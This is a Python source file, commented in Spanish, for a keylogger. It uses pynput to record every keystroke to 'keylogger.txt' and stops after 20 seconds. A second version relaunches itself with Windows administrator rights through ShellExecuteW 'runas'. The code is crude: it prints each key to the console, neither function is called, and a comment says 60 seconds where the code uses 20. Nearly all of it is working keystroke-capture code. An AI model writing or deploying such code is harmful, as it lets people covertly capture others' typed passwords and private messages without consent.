import sys,ctypes
from _io import open
from pynput.keyboard import Listener
import time


def archivoNormal():
    try:
        archivo = open('keylogger.txt', 'w')
    except:
        print("PERMISO DE ADMINISTRADOR")
    tiempo = time.time()
    def escuchar(tecla):
        tecla = str(tecla)
        print(tecla)
        if tecla == 'Key.enter':
            archivo.write('\n')
        elif tecla == 'Key.space':
            archivo.write(' ')
        elif tecla == 'Key.backspace':
            archivo.write('%BORRAR%')
        # elif tecla == "'\\x03'":
        else:
            # ESCRIBE EN EL ARCHIVO Y QUITA LAS COMILLAS
            archivo.write(tecla.replace("'", ""))
        # SI EL TIEMPO LLEGA A 60
        if time.time() - tiempo > 20:
            # CIERRA EL ARCHIVO
            archivo.close()
            # CIERRA EL PROGRAMA
            try:
                quit()
                print("cerrado")
            except:
                sys.exit()

    with Listener(on_press=escuchar) as l:
        l.join()

#############################################################################################################
#METODO PARA VER PERMISOS
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def ArchivoPermisos():
    if is_admin():
        archivo = open('keylogger.txt', 'w')
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        try:
            archivo = open('keylogger.txt', 'w')
        except:
            print("ACTIVAR ACCESOS DE ADMINISTRADOR")
    #TEMPORIZADOR
    tiempo = time.time()

    def escuchar(tecla):
        tecla = str(tecla)
        print(tecla)
        if tecla == 'Key.enter':
            archivo.write('\n')
        elif tecla == 'Key.space':
            archivo.write(' ')
        elif tecla == 'Key.backspace':
            archivo.write('%BORRAR%')
        # elif tecla == "'\\x03'":
        else:
            # ESCRIBE EN EL ARCHIVO Y QUITA LAS COMILLAS
            archivo.write(tecla.replace("'", ""))
        # SI EL TIEMPO LLEGA A 60
        if time.time() - tiempo > 20:
            # CIERRA EL ARCHIVO
            archivo.close()
            # CIERRA EL PROGRAMA
            try:
                quit()
                print("cerrado")
            except:
                sys.exit()

    with Listener(on_press=escuchar) as l:
        l.join()


